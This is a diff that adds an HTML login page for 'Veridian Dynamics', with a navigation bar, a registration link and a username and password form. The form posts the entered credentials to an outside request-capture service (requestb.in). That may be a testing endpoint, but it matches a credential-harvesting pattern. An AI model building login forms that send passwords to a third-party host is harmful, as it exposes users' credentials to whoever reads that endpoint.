@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<link rel="stylesheet" type="text/css" href="/css/dynamics.css">
+	<link rel="stylesheet" type="text/css" href="/nv_box.css">
+	<meta charset="utf-8">
+	<title>Login</title>
+	<style type="text/css">
+		.space {
+			margin-top: 5px;
+		}
+
+
+	</style>
+</head>
+<body>
+	<nav>
+		<div>
+			<form action="/technology.html">
+			<button class="nav" id="home">Home</button>
+		</form>
+		<form action="/login.html">
+			<button class="nav" id="profile">Profile</button>
+		</form>
+			<button class="nav" id="share">Share</button>
+			<button class="nav" id="settings">Settings</button>
+		</div>
+	</nav>
+	<header>
+		<h1>Welcome to Veridian Dynamics!</h1>
+		<hr>
+		<h2>Please login to your account</h2>
+	</header>
+	<main>
+		<form method="POST" action="https://requestb.in/1j90iy81">
+			<input type="text" name="user" placeholder="Username" required="" autofocus>
+			<br>
+			<input type="password" name="password" placeholder="Password" required="" class="space">
+			<br>
+			<label>
+				<input type="checkbox" name="remember">Remember me for 2 weeks.
+			</label>
+			<br>
+			<button>Login</button>
+		</form>
+	</main>
+	<footer>
+		<h3>Not a member yet? Click <a href="/register.html">HERE</a> to register for a free account!</h3>
+	</footer>
+</body>
+</html>
